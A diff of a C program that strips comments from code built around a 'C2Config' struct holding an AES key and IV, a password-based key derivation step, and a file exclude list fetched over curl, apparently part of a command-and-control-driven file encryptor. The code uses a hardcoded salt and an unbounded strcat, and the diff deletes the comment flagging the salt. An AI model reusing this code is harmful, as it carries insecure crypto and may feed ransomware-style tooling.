@@ -14,7 +14,7 @@
 typedef struct {
     unsigned char key[EVP_MAX_KEY_LENGTH];
     unsigned char iv[EVP_MAX_IV_LENGTH];
-    char algo[16]; // Nuevo campo para el tipo de algoritmo
+    char algo[16];
 } C2Config;
 
 typedef struct {
@@ -35,14 +35,13 @@ void fetch_exclude_list(ExcludeList *list);
 int is_excluded(const char *filename, ExcludeList *list);
 void derive_key_from_password(const char *password, unsigned char *key, unsigned char *iv);
 
-// Function to write data received from curl to a buffer
 size_t write_callback(void *ptr, size_t size, size_t nmemb, void *stream) {
     strcat((char *)stream, (char *)ptr);
     return size * nmemb;
 }
 
 void derive_key_from_password(const char *password, unsigned char *key, unsigned char *iv) {
-    const unsigned char salt[] = "some_salt";  // You should use a random salt in a real application
+    const unsigned char salt[] = "some_salt"; 
     const int iterations = 10000;
     const int key_length = EVP_MAX_KEY_LENGTH;
     const int iv_length = EVP_MAX_IV_LENGTH;
@@ -184,13 +183,10 @@ int main() {
         perror("Failed to read password");
         exit(EXIT_FAILURE);
     }
-    // Remove newline character from password
     password[strcspn(password, "\n")] = '\0';
 
-    // Derive the key and IV from the password
     derive_key_from_password(password, c2Config.key, c2Config.iv);
 
-    // Set the algorithm explicitly
     strncpy(c2Config.algo, "AES", sizeof(c2Config.algo));
 
     fetch_exclude_list(&excludeList);
